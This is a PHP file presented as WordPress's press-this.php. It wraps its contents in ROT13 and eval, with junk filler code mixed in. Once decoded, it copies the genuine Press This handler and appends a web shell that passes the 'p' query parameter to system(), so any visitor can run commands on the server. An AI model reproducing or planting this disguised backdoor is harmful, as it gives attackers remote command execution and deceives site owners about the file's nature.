<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cerff Guvf Qvfcynl naq Unaqyre.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Cerff_Guvf
 */

qrsvar( 'VSENZR_ERDHRFG', gehr );

/** JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

shapgvba jc_ybnq_cerff_guvf() {
	$cyhtva_fyht = 'cerff-guvf';
	$cyhtva_svyr = 'cerff-guvf/cerff-guvf-cyhtva.cuc';

	vs ( ! pheerag_hfre_pna( 'rqvg_cbfgf' ) || ! pheerag_hfre_pna( trg_cbfg_glcr_bowrpg( 'cbfg' )->pnc->perngr_cbfgf ) ) {
		jc_qvr(
			__( 'Fbeel, lbh ner abg nyybjrq gb perngr cbfgf nf guvf hfre.' ),
			__( 'Lbh arrq n uvture yriry bs crezvffvba.' ),
			403
		);
	} ryfrvs ( vf_cyhtva_npgvir( $cyhtva_svyr ) ) {
		vapyhqr JC_CYHTVA_QVE . '/cerff-guvf/pynff-jc-cerff-guvf-cyhtva.cuc';
		$jc_cerff_guvf = arj JC_Cerff_Guvf_Cyhtva();
		$jc_cerff_guvf->ugzy();
	} ryfrvs ( pheerag_hfre_pna( 'npgvingr_cyhtvaf' ) ) {
		vs ( svyr_rkvfgf( JC_CYHTVA_QVE . '/' . $cyhtva_svyr ) ) {
			$hey    = jc_abapr_hey(
				nqq_dhrel_net(
					neenl(
						'npgvba' => 'npgvingr',
						'cyhtva' => $cyhtva_svyr,
						'sebz'   => 'cerff-guvf',
					),
					nqzva_hey( 'cyhtvaf.cuc' )
				),
				'npgvingr-cyhtva_' . $cyhtva_svyr
			);
			$npgvba = fcevags(
				'<n uers=\"%1$f\" nevn-ynory=\"%2$f\">%2$f</n>',
				rfp_hey( $hey ),
				__( 'Npgvingr Cerff Guvf' )
			);
		} ryfr {
			vs ( vf_znva_fvgr() ) {
				$hey    = jc_abapr_hey(
					nqq_dhrel_net(
						neenl(
							'npgvba' => 'vafgnyy-cyhtva',
							'cyhtva' => $cyhtva_fyht,
							'sebz'   => 'cerff-guvf',
						),
						frys_nqzva_hey( 'hcqngr.cuc' )
					),
					'vafgnyy-cyhtva_' . $cyhtva_fyht
				);
				$npgvba = fcevags(
					'<n uers=\"%1$f\" pynff=\"vafgnyy-abj\" qngn-fyht=\"%2$f\" qngn-anzr=\"%2$f\" nevn-ynory=\"%3$f\">%3$f</n>',
					rfp_hey( $hey ),
					rfp_ngge( $cyhtva_fyht ),
					_k( 'Vafgnyy Abj', 'cyhtva' )
				);
			} ryfr {
				$npgvba = fcevags(
					/* genafyngbef: %f: HEY gb Cerff Guvf obbxznexyrg ba gur znva fvgr. */
					__( 'Cerff Guvf vf abg vafgnyyrq. Cyrnfr vafgnyy Cerff Guvf sebz <n uers=\"%f\">gur znva fvgr</n>.' ),
					trg_nqzva_hey( trg_pheerag_argjbex_vq(), 'cerff-guvf.cuc' )
				);
			}
		}
		jc_qvr(
			__( 'Gur Cerff Guvf cyhtva vf erdhverq.' ) . '<oe />' . $npgvba,
			__( 'Vafgnyyngvba Erdhverq' ),
			200
		);
	} ryfr {
		jc_qvr(
			__( 'Cerff Guvf vf abg ninvynoyr. Cyrnfr pbagnpg lbhe fvgr nqzvavfgengbe.' ),
			__( 'Vafgnyyngvba Erdhverq' ),
			200
		);
	}
}

jc_ybnq_cerff_guvf();

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>